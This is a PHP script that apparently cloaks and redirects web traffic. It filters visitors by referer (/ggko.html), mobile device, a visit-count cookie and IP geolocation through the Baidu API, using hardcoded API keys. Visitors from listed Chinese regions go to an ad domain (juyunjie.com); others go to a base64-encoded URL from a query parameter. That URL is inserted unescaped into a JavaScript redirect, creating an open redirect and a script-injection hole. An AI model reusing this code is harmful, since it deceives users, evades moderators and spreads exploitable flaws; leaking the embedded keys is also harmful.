<?php 
set_time_limit(30);
error_reporting(0);
date_default_timezone_set("Asia/Shanghai");
header("cache-control:no-cache,must-revalidate");
header("Content-type: text/html; charset=utf-8");
$now = time();
$bj = $now - 6;
$ddo = get_domainx();
require_once 'Mobile_Detect.php';
$detectx = new Mobile_Detect;
preg_match('#/(\w+)\.html#i', $_SERVER['HTTP_REFERER'],$mcc);
if ($mcc[0] === "/ggko.html") {
    if ($detectx->isMobile() && ((date("w") == "5") || (date("w") == "4") || (date("w") == "3") || (date("w") == "6") || (date("w") == "0") || (date("w") == "1") || (date("w") == "2")) == true) {
        if (isset($_COOKIE['url'])) {
            if ($bj > $_COOKIE['t']) {
                switch ($_COOKIE['url']) {
                case 1:
                    acx();
                    break;
                case 2:
                    acx();
                    break;
                case 3:
                    cokitx();
                    basex();
                    break;
                case 4:
                    acx();
                    break;
                case 5:
                    acx();
                    break;
                case 6:
                    acx();
                    break;
                case 7:
                    cokitx();
                    basex();
                    break;
                case 8:
                    acx();
                    break;
                case 9:
                    acx();
                    break;
                case 10:
                    acx();
                    break;
                case 11:
                    cokitx();
                    basex();
                    break;
                case 12:
                    acx();
                    break;
                case 13:
                    acx();
                    break;
                case 14:
                    acx();
                    break;
                case 15:
                    cokitx();
                    basex();
                    break;
                case 16:
                    acx();
                    break;
                case 17:
                    cokitx();
                    basex();
                    break;
                case 18:
                    acx();
                    break;
                case 19:
                    acx();
                    break;
                case 20:
                    acx();
                    break;
                case 21:
                    cokitx();
                    basex();
                    break;
                case 22:
                    acx();
                    break;
                case 23:
                    acx();
                    break;
                case 24:
                    cokitx();
                    basex();
                    break;
                case 25:
                    acx();
                    break;
                case 26:
                    acx();
                    break;
                case 27:
                    cokitx();
                    basex();
                    break;
                case 28:
                    cokitx();
                    basex();
                    break;
                case 29:
                    acx();
                    break;
                case 30:
                    acx();
                    break;
                case 31:
                    cokitx();
                    basex();
                    break;
                case 32:
                    acx();
                    break;
                case 33:
                    acx();
                    break;
                case 34:
                    cokitx();
                    basex();
                    break;
                case 35:
                    acx();
                    break;
                }
            } else {
                basex();
            } //2
        } //1
        else {
            setcookie("url", "1", time() + 3600 * 24 * 2, "/", "$ddo", 0);
            setcookie("t", time(), time() + 3600 * 24 * 2, "/", "$ddo", 0);
            basex();
        }
    } else {

        basex();
    }
    exit();
}

function get_domainx() {
    $host = $_SERVER["HTTP_HOST"];
    $host = strtolower($host);
    if (strpos($host, '/') !== false) {
        $parse = @parse_url($host);
        $host = $parse['host'];
    } 
    $topleveldomaindb = array('com',
        'edu',
        'gov',
        'int',
        'mil',
        'net',
        'org',
        'biz',
        'info',
        'pro',
        'name',
        'museum',
        'coop',
        'aero',
        'xxx',
        'idv',
        'mobi',
        'cc',
        'me'
        );
    $str = '';
    foreach ($topleveldomaindb as $v) {
        $str .= ($str ? '|' : '') . $v;
    } 
    $matchstr = "[^\.]+\.(?:(" . $str . ")|\w{2}|((" . $str . ")\.\w{2}))$";
    if (preg_match("/" . $matchstr . "/ies", $host, $matchs)) {
        $domain = $matchs['0'];
    } else {
        $domain = $host;
    } 
    return $domain;
}

function cokitx() {
    global $ddo;
    setcookie("url", $_COOKIE['url'] + 1, time() + 3600 * 24 * 2, "/", "$ddo", 0);
}

function basex() {
    $urlx = $_GET['url'];
    $urlx = base64_decode($urlx);
    $urlx = str_replace('^', '.', $urlx);
    if ($urlx) {
        echo("<script>window.location.href='".$urlx."';</script>");
    }
}
function is_cityx($str, $find) {
    $pos = strpos($str, $find);
    if ($pos === false) {
        return false;
    } else {
        return true;
    }
}
function acx() {
usleep(600000);
    //第x次写cookie
    $aa = array("XDnoAKdX2a603o26ZzRoOXAD", "F454f8a5efe5e577997931cc01de3974", "5cf32b027c8927baa94c0fc655ab422a", "HQi0eHpVOLlRuIFlsTZNGlYvqLO56un3", "KcowYqyt2PUBGDWRL92Qovfj", "32f38c9491f2da9eb61106aaab1e9739");
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $random_keys = array_rand($aa);
    $header = array("Connection: Keep-Alive", "Accept: text/html, application/xhtml+xml, */*", "Pragma: no-cache", "Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3", "User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)", 'CLIENT-IP:'.$ip, 'X-FORWARDED-FOR:'.$ip);
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, "https://api.map.baidu.com/location/ip?ak=$aa[$random_keys]&ip=$ip");
    curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_TIMEOUT, 15);
    curl_setopt($curl, CURLOPT_AUTOREFERER, 1);
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $data = curl_exec($curl);
    curl_close($curl);
    if (strlen($data) > 2) {
        $info = json_decode($data, true);
        if ($info['status'] == "0") {
            $prov = $info['content']['address_detail']['province'];
            $ct = $info['content']['address_detail']['city'];
            if ((is_cityx($ct, '重庆') || is_cityx($prov, '四川') || is_cityx($prov, '山西') || is_cityx($prov, '辽宁') || is_cityx($prov, '湖北') || is_cityx($ct, '张家口') || is_cityx($ct, '承德') || is_cityx($ct, '石家庄') || is_cityx($ct, '廊坊') || is_cityx($ct, '衡水') || is_cityx($ct, '邢台') || is_cityx($ct, '保定') || is_cityx($ct, '唐山') || is_cityx($ct, '秦皇岛') || is_cityx($prov, '河南') || is_cityx($prov, '宁夏') || is_cityx($prov, '青海') || is_cityx($prov, '湖南') || is_cityx($prov, '广西') || is_cityx($prov, '贵州') || is_cityx($prov, '江西') || is_cityx($prov, '海南') || is_cityx($prov, '山东') || is_cityx($prov, '江苏') || is_cityx($ct, '上海') || is_cityx($prov, '浙江') || is_cityx($prov, '吉林') || is_cityx($prov, '武汉') || is_cityx($prov, '银川') || is_cityx($prov, '黑龙江') || is_cityx($prov, '天津') || is_cityx($prov, '安徽') || is_cityx($prov, '甘肃') || is_cityx($prov, '陕西') || is_cityx($ct, '茂名') || is_cityx($ct, '湛江') || is_cityx($ct, '汕头') || is_cityx($ct, '潮州') || is_cityx($ct, '汕尾') || is_cityx($ct, '海丰') || is_cityx($ct, '珠海') || is_cityx($ct, '阳西') || is_cityx($ct, '阳江') || is_cityx($ct, '深圳') || is_cityx($ct, '宁德') || is_cityx($ct, '台山') || is_cityx($ct, '南平') || is_cityx($ct, '三明') || is_cityx($ct, '平潭') || is_cityx($ct, '福州') || is_cityx($ct, '龙岩') || is_cityx($ct, '阳东') || is_cityx($ct, '普宁') || is_cityx($ct, '惠州') || is_cityx($ct, '澳门') || is_cityx($ct, '厦门') || is_cityx($ct, '昆明') || is_cityx($ct, '玉溪') || is_cityx($ct, '昭通') || is_cityx($ct, '丽江') || is_cityx($ct, '大理') || is_cityx($ct, '普洱') || is_cityx($ct, '保山')) == true)
  			{
                global $ddo;
                $cc = $_COOKIE['url'] + "1";
                setcookie("url", $cc, time() + 3600 * 24 * 2, "/", "$ddo", 0);
                setcookie("t", time(), time() + 3600 * 24 * 2, "/", "$ddo", 0);
                $urlx = $_GET['url'];
                if (strlen($urlx) > 15) {
                    echo("<script>window.location.href='https://juyunjie.com/?ad=jk';</script>");
                } else {
                    $urlx = $_GET['url'];
                    $urlx = base64_decode($urlx);
                    $urlx = str_replace('^', '.', $urlx);
                    if ($urlx) {
                        echo("<script>window.location.href='".$urlx."';</script>");
                    }
                }
            } else {
                $urlx = $_GET['url'];
                $urlx = base64_decode($urlx);
                $urlx = str_replace('^', '.', $urlx);
                if ($urlx) {
                    echo("<script>window.location.href='".$urlx."';</script>");
                }
            }
        } else {
            $urlx = $_GET['url'];
            $urlx = base64_decode($urlx);
            $urlx = str_replace('^', '.', $urlx);
            if ($urlx) {
                echo("<script>window.location.href='".$urlx."';</script>");
            }
        }
    } else {
        $urlx = $_GET['url'];
        $urlx = base64_decode($urlx);
        $urlx = str_replace('^', '.', $urlx);
        if ($urlx) {
            echo("<script>window.location.href='".$urlx."';</script>");
        }
    }
} ?>